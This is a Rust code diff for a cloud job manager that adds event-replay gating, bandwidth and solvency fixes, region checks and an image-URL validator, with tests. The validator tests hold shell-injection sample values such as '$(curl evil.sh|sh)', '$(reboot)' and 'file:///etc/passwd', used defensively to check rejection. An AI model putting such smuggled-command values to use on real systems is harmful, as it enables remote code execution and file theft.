@@ -11,6 +11,7 @@ use serde_json::Value;
 use sqlx::postgres::PgPoolOptions;
 use sqlx::{FromRow, PgPool, Type};
 use tokio::sync::mpsc::{self, Sender};
+use tokio::sync::watch;
 use tokio::time::sleep;
 use tokio::time::{Duration, Instant};
 use tracing::{error, info, info_span, Instrument};
@@ -248,6 +249,9 @@ enum JobResult {
     Internal,
 }
 
+// number of events fetched from the db in one go
+const EVENT_BATCH_SIZE: i64 = 1000;
+
 pub async fn run(
     infra_provider: impl InfraProvider + Send + Sync + Clone + 'static,
     db_url: String,
@@ -268,6 +272,16 @@ pub async fn run(
     // trying to implicitly resume connections can cause issues
 
     let mut last_processed_id: i64 = -1;
+
+    // events are replayed from the beginning of the table on start
+    // job managers must not act on a job (insolvency, launches, terminations) while only
+    // a part of its stored events have been delivered, e.g. a job which was opened with
+    // little balance and topped up later looks insolvent until its deposits are processed
+    // this is set once the reader has delivered everything that was stored
+    let (caught_up_tx, caught_up_rx) = watch::channel(false);
+    // whether the last fetch was a full batch, i.e. there might be more events waiting
+    let mut full_batch = false;
+
     loop {
         info!("Connecting to DB endpoint...");
         let db_pool = match PgPoolOptions::new()
@@ -290,7 +304,10 @@ pub async fn run(
         info!("Connected to DB endpoint");
 
         'run: loop {
-            sleep(Duration::from_secs(5)).await;
+            // do not wait between batches while catching up
+            if !full_batch {
+                sleep(Duration::from_secs(5)).await;
+            }
 
             let mut attempts = 5;
             let mut delay = 100;
@@ -316,6 +333,8 @@ pub async fn run(
                     }
                 }
             }
+
+            full_batch = job_events.len() as i64 >= EVENT_BATCH_SIZE;
 
             for event in job_events {
                 let sender = match event.event_name {
@@ -365,6 +384,7 @@ pub async fn run(
                                 address_blacklist,
                                 extra_decimals,
                                 job_registry.clone(),
+                                caught_up_rx.clone(),
                             )
                             .instrument(info_span!(parent: None, "job", ?event.job_id)),
                         );
@@ -390,6 +410,11 @@ pub async fn run(
 
                 last_processed_id = event_id;
             }
+
+            if !full_batch && !*caught_up_tx.borrow() {
+                info!("Reached the end of stored events");
+                caught_up_tx.send_replace(true);
+            }
         }
     }
 }
@@ -404,10 +429,11 @@ async fn fetch_job_events(
         FROM job_events
         WHERE id > $1
         ORDER BY id ASC
-        LIMIT 1000
+        LIMIT $2
         "#,
     )
     .bind(last_processed_id)
+    .bind(EVENT_BATCH_SIZE)
     .fetch_all(pool)
     .await?;
 
@@ -428,7 +454,12 @@ async fn job_manager(
     address_blacklist: &[String],
     extra_decimals: i64,
     job_registry: JobRegistry,
+    // false while stored events are still being replayed, see run()
+    mut caught_up: watch::Receiver<bool>,
 ) -> JobResult {
+    // set if the other end goes away, nothing would ever signal us in that case
+    let mut reader_gone = false;
+
     let mut state = JobState::new(
         &context,
         job_id.clone(),
@@ -450,7 +481,11 @@ async fn job_manager(
     // If job is insolvent, schedule termination
     // Once job is successfully terminated, break out
     // Insolvency and heartbeats only matter when job is not already scheduled for termination
+    // While stored events are being replayed, only events are processed, the rest is held
+    // back till the job has seen its full history
     'event: loop {
+        let replaying = !reader_gone && !*caught_up.borrow();
+
         // compute time to insolvency
         let insolvency_duration = state.insolvency_duration(extra_decimals);
         info!(duration = insolvency_duration.as_secs(), "Insolvency after");
@@ -506,16 +541,25 @@ async fn job_manager(
                 };
             }
 
+            // wait for the replay to finish
+            // events sent before the signal are already in the channel and get picked up
+            // above before anything below runs
+            res = caught_up.changed(), if replaying => {
+                if res.is_err() {
+                    reader_gone = true;
+                }
+            }
+
             // insolvency check
             // enable when processing is successful
-            () = sleep(insolvency_duration), if job_result == JobResult::Success => {
+            () = sleep(insolvency_duration), if !replaying && job_result == JobResult::Success => {
                 state.handle_insolvency();
                 job_result = JobResult::Done;
             }
 
             // aws delayed spin up check
             // should only happen if scheduled
-            () = sleep(aws_delay_timeout), if state.infra_change_scheduled => {
+            () = sleep(aws_delay_timeout), if !replaying && state.infra_change_scheduled => {
                 let res = state.change_infra(&mut infra_provider).await;
                 if res && !state.infra_state {
                     // successful termination, exit
@@ -525,7 +569,7 @@ async fn job_manager(
 
             // running instance heartbeat check
             // should only happen if infra change is not scheduled
-            () = sleep(Duration::from_secs(5)), if !state.infra_change_scheduled => {
+            () = sleep(Duration::from_secs(5)), if !replaying && !state.infra_change_scheduled => {
                 state.heartbeat_check(&mut infra_provider).await;
             }
         }
@@ -552,6 +596,59 @@ fn parse_event(event_name: JobEventName, event_data: Value) -> Result<DecodedJob
         JobEventName::ReviseRateCancelled => Ok(DecodedJobEvent::ReviseRateCancelled(serde_json::from_value(event_data.clone()).inspect_err(|err| error!(?err, data = ?event_data, "JOB_REVISE_RATE_CANCELLED: Decode failure")).map_err(|_| JobResult::Internal)?)),
         JobEventName::ReviseRateFinalized => Ok(DecodedJobEvent::ReviseRateFinalized(serde_json::from_value(event_data.clone()).inspect_err(|err| error!(?err, data = ?event_data, "JOB_REVISE_RATE_FINALIZED: Decode failure")).map_err(|_| JobResult::Internal)?)),
     }
+}
+
+// The image url comes from job metadata and ends up in a command on the job host
+// It is quoted there, this is a second line of defence and gives a clean rejection
+// Allows http(s) urls made of unreserved characters and the usual url delimiters,
+// anything else has to be percent encoded
+pub fn validate_image_url(url: &str) -> Result<()> {
+    if url.len() > 2048 {
+        return Err(anyhow!("url is too long"));
+    }
+
+    let Some(rest) = url
+        .strip_prefix("https://")
+        .or_else(|| url.strip_prefix("http://"))
+    else {
+        return Err(anyhow!("url is not http or https"));
+    };
+
+    if rest.is_empty() {
+        return Err(anyhow!("url has no host"));
+    }
+
+    if let Some(c) = url
+        .chars()
+        .find(|c| !c.is_ascii_alphanumeric() && !"-._~:/?#[]@%&=+,".contains(*c))
+    {
+        return Err(anyhow!("url has unsupported character {c:?}"));
+    }
+
+    Ok(())
+}
+
+// bandwidth in kbit/s bought by the part of the rate above the instance min rate
+// zero if nothing is left over or the region has no usable bandwidth rate,
+// the infra provider applies its own floor in that case
+fn compute_bandwidth(rate: U256, min_rate: U256, region: &str, gb_rates: &[GBRateCard]) -> u64 {
+    let Some(gb_cost) = gb_rates
+        .iter()
+        .find(|entry| entry.region_code == region)
+        .map(|entry| entry.rate)
+    else {
+        return 0;
+    };
+
+    if gb_cost.is_zero() {
+        return 0;
+    }
+
+    (rate
+        .saturating_sub(min_rate)
+        .saturating_mul(U256::from(1024 * 1024 * 8))
+        / gb_cost)
+        .saturating_to::<u64>()
 }
 
 fn whitelist_blacklist_check(
@@ -656,9 +753,15 @@ impl<'a> JobState<'a> {
         if self.rate == U256::ZERO {
             Duration::from_secs(0)
         } else {
+            // while a rate revision is pending, rate is the requested rate and original_rate
+            // is the one the contract keeps charging till the revision is finalized
+            // use the higher of the two so a pending revision to a lower rate does not
+            // make the balance look like it lasts longer than it does
+            let rate = self.rate.max(self.original_rate);
+
             // solvent for balance / rate seconds from last_settled with 300s as margin
             Duration::from_secs(
-                (self.balance * U256::from(10).pow(U256::from(extra_decimals)) / self.rate)
+                (self.balance * U256::from(10).pow(U256::from(extra_decimals)) / rate)
                     .saturating_to::<u64>()
                     .saturating_sub(300),
             )
@@ -746,6 +849,13 @@ impl<'a> JobState<'a> {
             true
         } else {
             // terminate mode
+            if !self.allowed_regions.contains(&self.region) {
+                // instances are only ever launched in allowed regions
+                // nothing to terminate, and the provider has no client for this region
+                info!(self.region, "Region not supported, nothing to terminate");
+                return true;
+            }
+
             let res = infra_provider.spin_down(&self.job_id, &self.region).await;
             if let Err(err) = res {
                 error!(?err, "Failed to terminate instance");
@@ -850,18 +960,8 @@ impl<'a> JobState<'a> {
 
                 // launch only if rate is more than min
                 if self.rate >= self.min_rate {
-                    for entry in gb_rates {
-                        if entry.region_code == self.region {
-                            let gb_cost = entry.rate;
-                            let bandwidth_rate = self.rate - self.min_rate;
-
-                            self.bandwidth = (bandwidth_rate
-                                .saturating_mul(U256::from(1024 * 1024 * 8))
-                                / gb_cost)
-                                .saturating_to::<u64>();
-                            break;
-                        }
-                    }
+                    self.bandwidth =
+                        compute_bandwidth(self.rate, self.min_rate, &self.region, gb_rates);
                     self.schedule_launch(self.launch_delay);
                     JobResult::Success
                 } else {
@@ -1005,6 +1105,25 @@ impl<'a> JobState<'a> {
                     return JobResult::Internal;
                 }
                 self.original_rate = event.new_rate;
+
+                // the new rate is what is paid from here on, bandwidth has to follow it
+                let bandwidth = compute_bandwidth(self.rate, self.min_rate, &self.region, gb_rates);
+                if bandwidth != self.bandwidth {
+                    info!(
+                        id = event.job_id,
+                        old = self.bandwidth,
+                        new = bandwidth,
+                        "Bandwidth changed with rate"
+                    );
+                    self.bandwidth = bandwidth;
+
+                    // apply on the running instance, a launch which is already scheduled
+                    // picks it up by itself
+                    if !self.infra_change_scheduled {
+                        self.schedule_launch(0);
+                    }
+                }
+
                 info!(
                     id = event.job_id,
                     self.original_rate = self.original_rate.to_string(),
@@ -1092,6 +1211,7 @@ impl<'a> JobState<'a> {
         let Some(url) = metadata_json["url"].as_str() else {
             return Err(anyhow!("EIF url not found! Exiting job"));
         };
+        validate_image_url(url).context("EIF url not usable")?;
         self.eif_url = url.to_string();
 
         let Ok(init_params) =
@@ -1214,7 +1334,7 @@ mod tests {
 
     use alloy_primitives::hex::FromHex;
     use alloy_primitives::{B256, U256};
-    use tokio::sync::mpsc;
+    use tokio::sync::{mpsc, watch};
     use tokio::time::{sleep, Duration, Instant};
 
     use crate::market::{self, JobEvent};
@@ -1263,6 +1383,18 @@ mod tests {
         job_manager_params: JobManagerParams,
         test_results: TestResults,
     ) {
+        run_test_with_replay(start_time, logs, 0, job_manager_params, test_results).await;
+    }
+
+    // the first `replayed` logs are treated as stored events which are replayed on start
+    // the job manager is told that the replay is over after they are sent
+    async fn run_test_with_replay(
+        start_time: Instant,
+        logs: Vec<(u64, Action)>,
+        replayed: usize,
+        job_manager_params: JobManagerParams,
+        test_results: TestResults,
+    ) {
         let context = TestSystemContext { start: start_time };
 
         let job_num = B256::from_hex(&job_manager_params.job_id.id).unwrap();
@@ -1273,17 +1405,26 @@ mod tests {
             .collect();
 
         let (tx, rx) = mpsc::channel::<JobEvent>(10);
-        let mut aws: TestAws = Default::default();
+        let mut aws = TestAws::new(&job_manager_params.allowed_regions);
         let job_registry = market::JobRegistry::new_test();
+        let job_registry_handle = job_registry.clone();
+        let job_id = job_manager_params.job_id.id.clone();
+
+        let (caught_up_tx, caught_up_rx) = watch::channel(replayed == 0);
 
         tokio::spawn(async move {
-            for (moment, event) in job_logs {
+            for (idx, (moment, event)) in job_logs.into_iter().enumerate() {
                 let delay = start_time + Duration::from_secs(moment) - Instant::now();
                 sleep(delay).await;
                 if let Err(err) = tx.send(event).await {
                     println!("{}", err);
                 }
+                if idx + 1 == replayed {
+                    caught_up_tx.send_replace(true);
+                }
             }
+            // keep the sender around till the job manager is done
+            caught_up_tx.closed().await;
         });
 
         let res = market::job_manager(
@@ -1299,13 +1440,151 @@ mod tests {
             &job_manager_params.address_blacklist,
             12,
             job_registry,
+            caught_up_rx,
         )
         .await;
 
         assert!(aws.instances.is_empty());
 
+        // jobs which are done or rejected must be recorded so they are skipped on restarts
+        assert_eq!(
+            job_registry_handle.is_job_terminated(&job_id),
+            res == JobResult::Done || res == JobResult::Failed
+        );
+
         assert_eq!(res, test_results.res);
         assert_eq!(aws.outcomes, test_results.outcomes);
+    }
+
+    // restart case: the job was opened 5000s ago with funds for 1000s and topped up later
+    // both events are already in the db and get replayed one after the other
+    #[tokio::test(start_paused = true)]
+    async fn test_replay_keeps_topped_up_job() {
+        let start_time = Instant::now();
+        tokio::time::advance(Duration::from_secs(5000)).await;
+        let job_id = format!("{:064x}", 1);
+
+        let logs = vec![
+            (5000, Action::Open("{\"region\":\"ap-south-1\",\"url\":\"https://example.com/enclave.eif\",\"instance\":\"c6a.xlarge\",\"memory\":4096,\"vcpu\":2}".to_string(),31000000000000u64,31000u64,0)),
+            // the deposit is delivered in the next db poll
+            (5005, Action::Deposit(31000000)),
+            (5400, Action::Close),
+        ];
+
+        let job_manager_params = JobManagerParams {
+            job_id: market::JobId {
+                id: job_id.clone(),
+                operator: "abc".into(),
+                contract: "xyz".into(),
+                chain: "123".into(),
+            },
+            allowed_regions: vec!["ap-south-1".to_owned()],
+            address_whitelist: vec![],
+            address_blacklist: vec![],
+        };
+
+        let test_results = TestResults {
+            res: JobResult::Done,
+            outcomes: vec![
+                TestAwsOutcome::SpinUp(test::SpinUpOutcome {
+                    time: start_time + Duration::from_secs(5300),
+                    job: job_id.clone(),
+                    instance_type: "c6a.xlarge".into(),
+                    family: "salmon".into(),
+                    region: "ap-south-1".into(),
+                    req_mem: 4096,
+                    req_vcpu: 2,
+                    bandwidth: 76,
+                    image_url: "https://example.com/enclave.eif".into(),
+                    debug: false,
+                    init_params: [].into(),
+                    contract_address: "xyz".into(),
+                    chain_id: "123".into(),
+                    instance_id: compute_instance_id(0),
+                }),
+                TestAwsOutcome::SpinDown(test::SpinDownOutcome {
+                    time: start_time + Duration::from_secs(5400),
+                    job: job_id,
+                    region: "ap-south-1".into(),
+                }),
+            ],
+        };
+
+        run_test_with_replay(start_time, logs, 2, job_manager_params, test_results).await;
+    }
+
+    // restart case: the job ran out of funds while the control plane was down
+    #[tokio::test(start_paused = true)]
+    async fn test_replay_terminates_insolvent_job() {
+        let start_time = Instant::now();
+        tokio::time::advance(Duration::from_secs(5000)).await;
+        let job_id = format!("{:064x}", 1);
+
+        let logs = vec![
+            (5000, Action::Open("{\"region\":\"ap-south-1\",\"url\":\"https://example.com/enclave.eif\",\"instance\":\"c6a.xlarge\",\"memory\":4096,\"vcpu\":2}".to_string(),31000000000000u64,31000u64,0)),
+            // arrives after the replay is over, too late
+            (5005, Action::Deposit(31000000)),
+        ];
+
+        let job_manager_params = JobManagerParams {
+            job_id: market::JobId {
+                id: job_id.clone(),
+                operator: "abc".into(),
+                contract: "xyz".into(),
+                chain: "123".into(),
+            },
+            allowed_regions: vec!["ap-south-1".to_owned()],
+            address_whitelist: vec![],
+            address_blacklist: vec![],
+        };
+
+        let test_results = TestResults {
+            res: JobResult::Done,
+            outcomes: vec![TestAwsOutcome::SpinDown(test::SpinDownOutcome {
+                time: start_time + Duration::from_secs(5000),
+                job: job_id,
+                region: "ap-south-1".into(),
+            })],
+        };
+
+        run_test_with_replay(start_time, logs, 1, job_manager_params, test_results).await;
+    }
+
+    // restart case: a job which was closed while its events are still being replayed
+    // is not launched in between
+    #[tokio::test(start_paused = true)]
+    async fn test_replay_does_not_launch_closed_job() {
+        let start_time = Instant::now();
+        let job_id = format!("{:064x}", 1);
+
+        let logs = vec![
+            (0, Action::Open("{\"region\":\"ap-south-1\",\"url\":\"https://example.com/enclave.eif\",\"instance\":\"c6a.xlarge\",\"memory\":4096,\"vcpu\":2}".to_string(),31000000000000u64,31000u64,0)),
+            // the stored close is delivered after the launch delay has passed
+            (400, Action::Close),
+        ];
+
+        let job_manager_params = JobManagerParams {
+            job_id: market::JobId {
+                id: job_id.clone(),
+                operator: "abc".into(),
+                contract: "xyz".into(),
+                chain: "123".into(),
+            },
+            allowed_regions: vec!["ap-south-1".to_owned()],
+            address_whitelist: vec![],
+            address_blacklist: vec![],
+        };
+
+        let test_results = TestResults {
+            res: JobResult::Done,
+            outcomes: vec![TestAwsOutcome::SpinDown(test::SpinDownOutcome {
+                time: start_time + Duration::from_secs(400),
+                job: job_id,
+                region: "ap-south-1".into(),
+            })],
+        };
+
+        run_test_with_replay(start_time, logs, 2, job_manager_params, test_results).await;
     }
 
     #[tokio::test(start_paused = true)]
@@ -1608,7 +1887,8 @@ mod tests {
                     region: "ap-south-1".into(),
                     req_mem: 4096,
                     req_vcpu: 2,
-                    bandwidth: 76,
+                    // from the rate finalized before the launch
+                    bandwidth: 153,
                     image_url: "https://example.com/enclave.eif".into(),
                     debug: false,
                     init_params: [].into(),
@@ -1649,13 +1929,42 @@ mod tests {
             address_blacklist: vec![],
         };
 
+        // the provider has no client for ap-east-1, it must not be called at all
         let test_results = TestResults {
             res: JobResult::Failed,
-            outcomes: vec![TestAwsOutcome::SpinDown(test::SpinDownOutcome {
-                time: start_time + Duration::from_secs(0),
-                job: job_id,
-                region: "ap-east-1".into(),
-            })],
+            outcomes: vec![],
+        };
+
+        run_test(start_time, logs, job_manager_params, test_results).await;
+    }
+
+    #[tokio::test(start_paused = true)]
+    async fn test_invalid_metadata_default_region_not_allowed() {
+        let start_time = Instant::now();
+        let job_id = format!("{:064x}", 1);
+
+        // metadata fails to parse, the job is left with the default region
+        // which this operator does not run
+        let logs = vec![
+            (0, Action::Open("not json".to_string(), 31000000000000u64, 31000u64, 0)),
+            (505, Action::Close),
+        ];
+
+        let job_manager_params = JobManagerParams {
+            job_id: market::JobId {
+                id: job_id.clone(),
+                operator: "abc".into(),
+                contract: "xyz".into(),
+                chain: "123".into(),
+            },
+            allowed_regions: vec!["us-east-1".to_owned()],
+            address_whitelist: vec![],
+            address_blacklist: vec![],
+        };
+
+        let test_results = TestResults {
+            res: JobResult::Failed,
+            outcomes: vec![],
         };
 
         run_test(start_time, logs, job_manager_params, test_results).await;
@@ -1797,6 +2106,158 @@ mod tests {
         run_test(start_time, logs, job_manager_params, test_results).await;
     }
 
+    #[test]
+    fn test_compute_bandwidth() {
+        let gb_rates = test::get_gb_rates();
+        let min_rate = U256::from(29997916666666u64);
+
+        assert_eq!(
+            market::compute_bandwidth(U256::from(31000000000000u64), min_rate, "ap-south-1", &gb_rates),
+            76
+        );
+        // exactly the min rate
+        assert_eq!(market::compute_bandwidth(min_rate, min_rate, "ap-south-1", &gb_rates), 0);
+        // region without a bandwidth rate
+        assert_eq!(
+            market::compute_bandwidth(U256::from(31000000000000u64), min_rate, "us-east-1", &gb_rates),
+            0
+        );
+        // zero bandwidth rate in the rates file
+        let mut free = test::get_gb_rates();
+        free[0].rate = U256::ZERO;
+        assert_eq!(
+            market::compute_bandwidth(U256::from(31000000000000u64), min_rate, "ap-south-1", &free),
+            0
+        );
+    }
+
+    #[test]
+    fn test_validate_image_url() {
+        for url in [
+            "https://example.com/enclave.eif",
+            "http://example.com:8080/a/b-c_d~e.eif",
+            "https://bucket.s3.amazonaws.com/x.eif?X-Amz-Signature=ab12&X-Amz-Date=2025%2F01,a+b#f",
+            "https://[2001:db8::1]/enclave.eif",
+            "https://user@example.com/enclave.eif",
+        ] {
+            assert!(market::validate_image_url(url).is_ok(), "{url}");
+        }
+
+        for url in [
+            "",
+            "https://",
+            "example.com/enclave.eif",
+            "ftp://example.com/enclave.eif",
+            "file:///etc/passwd",
+            "-o/etc/passwd",
+            "https://example.com/$(reboot)",
+            "https://example.com/`reboot`",
+            "https://example.com/a;reboot",
+            "https://example.com/a|reboot",
+            "https://example.com/a'b",
+            "https://example.com/a\"b",
+            "https://example.com/a b",
+            "https://example.com/a\nb",
+            "https://example.com/a\\b",
+            "https://example.com/{a,b}",
+            "https://example.com/a>b",
+            "https://example.com/\u{0}",
+            "https://example.com/\u{e9}",
+        ] {
+            assert!(market::validate_image_url(url).is_err(), "{url}");
+        }
+
+        assert!(market::validate_image_url(&format!("https://e.com/{}", "a".repeat(2048))).is_err());
+    }
+
+    #[tokio::test(start_paused = true)]
+    async fn test_shell_characters_in_eif_url() {
+        let start_time = Instant::now();
+        let job_id = format!("{:064x}", 1);
+
+        let logs = vec![
+            (0, Action::Open("{\"region\":\"ap-south-1\",\"url\":\"https://example.com/$(curl evil.sh|sh)\",\"instance\":\"c6a.xlarge\",\"memory\":4096,\"vcpu\":2}".to_string(),31000000000000u64,31000u64,0)),
+            (505, Action::Close),
+        ];
+
+        let job_manager_params = JobManagerParams {
+            job_id: market::JobId {
+                id: job_id.clone(),
+                operator: "abc".into(),
+                contract: "xyz".into(),
+                chain: "123".into(),
+            },
+            allowed_regions: vec!["ap-south-1".to_owned()],
+            address_whitelist: vec![],
+            address_blacklist: vec![],
+        };
+
+        // rejected like any other bad metadata, never launched
+        let test_results = TestResults {
+            res: JobResult::Failed,
+            outcomes: vec![TestAwsOutcome::SpinDown(test::SpinDownOutcome {
+                time: start_time + Duration::from_secs(0),
+                job: job_id,
+                region: "ap-south-1".into(),
+            })],
+        };
+
+        run_test(start_time, logs, job_manager_params, test_results).await;
+    }
+
+    // a job paying exactly the min rate is accepted, with no bandwidth on top
+    #[tokio::test(start_paused = true)]
+    async fn test_exact_min_rate() {
+        let start_time = Instant::now();
+        let job_id = format!("{:064x}", 1);
+
+        let logs = vec![
+            (0, Action::Open("{\"region\":\"ap-south-1\",\"url\":\"https://example.com/enclave.eif\",\"instance\":\"c6a.xlarge\",\"memory\":4096,\"vcpu\":2}".to_string(),29997916666666u64,31000u64,0)),
+            (301, Action::Close),
+        ];
+
+        let job_manager_params = JobManagerParams {
+            job_id: market::JobId {
+                id: job_id.clone(),
+                operator: "abc".into(),
+                contract: "xyz".into(),
+                chain: "123".into(),
+            },
+            allowed_regions: vec!["ap-south-1".to_owned()],
+            address_whitelist: vec![],
+            address_blacklist: vec![],
+        };
+
+        let test_results = TestResults {
+            res: JobResult::Done,
+            outcomes: vec![
+                TestAwsOutcome::SpinUp(test::SpinUpOutcome {
+                    time: start_time + Duration::from_secs(300),
+                    job: job_id.clone(),
+                    instance_type: "c6a.xlarge".into(),
+                    family: "salmon".into(),
+                    region: "ap-south-1".into(),
+                    req_mem: 4096,
+                    req_vcpu: 2,
+                    bandwidth: 0,
+                    image_url: "https://example.com/enclave.eif".into(),
+                    debug: false,
+                    init_params: [].into(),
+                    contract_address: "xyz".into(),
+                    chain_id: "123".into(),
+                    instance_id: compute_instance_id(0),
+                }),
+                TestAwsOutcome::SpinDown(test::SpinDownOutcome {
+                    time: start_time + Duration::from_secs(301),
+                    job: job_id,
+                    region: "ap-south-1".into(),
+                }),
+            ],
+        };
+
+        run_test(start_time, logs, job_manager_params, test_results).await;
+    }
+
     #[tokio::test(start_paused = true)]
     async fn test_min_rate() {
         let start_time = Instant::now();
@@ -1911,6 +2372,133 @@ mod tests {
                 }),
                 TestAwsOutcome::SpinDown(test::SpinDownOutcome {
                     time: start_time + Duration::from_secs(350),
+                    job: job_id,
+                    region: "ap-south-1".into(),
+                }),
+            ],
+        };
+
+        run_test(start_time, logs, job_manager_params, test_results).await;
+    }
+
+    // the bandwidth limit follows the rate once a revision is finalized
+    #[tokio::test(start_paused = true)]
+    async fn test_revise_rate_finalized_updates_bandwidth() {
+        let start_time = Instant::now();
+        let job_id = format!("{:064x}", 1);
+
+        let logs = vec![
+            (0, Action::Open("{\"region\":\"ap-south-1\",\"url\":\"https://example.com/enclave.eif\",\"instance\":\"c6a.xlarge\",\"memory\":4096,\"vcpu\":2}".to_string(),32000000000000u64,31000u64,0)),
+            (350, Action::ReviseRateInitiated(31000000000000u64)),
+            (400, Action::ReviseRateFinalized(31000000000000u64)),
+            (450, Action::Close),
+        ];
+
+        let job_manager_params = JobManagerParams {
+            job_id: market::JobId {
+                id: job_id.clone(),
+                operator: "abc".into(),
+                contract: "xyz".into(),
+                chain: "123".into(),
+            },
+            allowed_regions: vec!["ap-south-1".to_owned()],
+            address_whitelist: vec![],
+            address_blacklist: vec![],
+        };
+
+        let test_results = TestResults {
+            res: JobResult::Done,
+            outcomes: vec![
+                TestAwsOutcome::SpinUp(test::SpinUpOutcome {
+                    time: start_time + Duration::from_secs(300),
+                    job: job_id.clone(),
+                    instance_type: "c6a.xlarge".into(),
+                    family: "salmon".into(),
+                    region: "ap-south-1".into(),
+                    req_mem: 4096,
+                    req_vcpu: 2,
+                    bandwidth: 153,
+                    image_url: "https://example.com/enclave.eif".into(),
+                    debug: false,
+                    init_params: [].into(),
+                    contract_address: "xyz".into(),
+                    chain_id: "123".into(),
+                    instance_id: compute_instance_id(0),
+                }),
+                // nothing changes while the revision is pending
+                TestAwsOutcome::SpinUp(test::SpinUpOutcome {
+                    time: start_time + Duration::from_secs(400),
+                    job: job_id.clone(),
+                    instance_type: "c6a.xlarge".into(),
+                    family: "salmon".into(),
+                    region: "ap-south-1".into(),
+                    req_mem: 4096,
+                    req_vcpu: 2,
+                    bandwidth: 76,
+                    image_url: "https://example.com/enclave.eif".into(),
+                    debug: false,
+                    init_params: [].into(),
+                    contract_address: "xyz".into(),
+                    chain_id: "123".into(),
+                    instance_id: compute_instance_id(0),
+                }),
+                TestAwsOutcome::SpinDown(test::SpinDownOutcome {
+                    time: start_time + Duration::from_secs(450),
+                    job: job_id,
+                    region: "ap-south-1".into(),
+                }),
+            ],
+        };
+
+        run_test(start_time, logs, job_manager_params, test_results).await;
+    }
+
+    // the contract charges the old rate till a revision is finalized
+    #[tokio::test(start_paused = true)]
+    async fn test_pending_lower_rate_does_not_extend_solvency() {
+        let start_time = Instant::now();
+        let job_id = format!("{:064x}", 1);
+
+        let logs = vec![
+            (0, Action::Open("{\"region\":\"ap-south-1\",\"url\":\"https://example.com/enclave.eif\",\"instance\":\"c6a.xlarge\",\"memory\":4096,\"vcpu\":2}".to_string(),31000000000000u64,31000u64,0)),
+            // funds last 1000s at the old rate, 1033s at the new one
+            (400, Action::ReviseRateInitiated(30000000000000u64)),
+        ];
+
+        let job_manager_params = JobManagerParams {
+            job_id: market::JobId {
+                id: job_id.clone(),
+                operator: "abc".into(),
+                contract: "xyz".into(),
+                chain: "123".into(),
+            },
+            allowed_regions: vec!["ap-south-1".to_owned()],
+            address_whitelist: vec![],
+            address_blacklist: vec![],
+        };
+
+        let test_results = TestResults {
+            res: JobResult::Done,
+            outcomes: vec![
+                TestAwsOutcome::SpinUp(test::SpinUpOutcome {
+                    time: start_time + Duration::from_secs(300),
+                    job: job_id.clone(),
+                    instance_type: "c6a.xlarge".into(),
+                    family: "salmon".into(),
+                    region: "ap-south-1".into(),
+                    req_mem: 4096,
+                    req_vcpu: 2,
+                    bandwidth: 76,
+                    image_url: "https://example.com/enclave.eif".into(),
+                    debug: false,
+                    init_params: [].into(),
+                    contract_address: "xyz".into(),
+                    chain_id: "123".into(),
+                    instance_id: compute_instance_id(0),
+                }),
+                // 1000s at the old rate, less the 300s margin
+                TestAwsOutcome::SpinDown(test::SpinDownOutcome {
+                    time: start_time + Duration::from_secs(700),
                     job: job_id,
                     region: "ap-south-1".into(),
                 }),
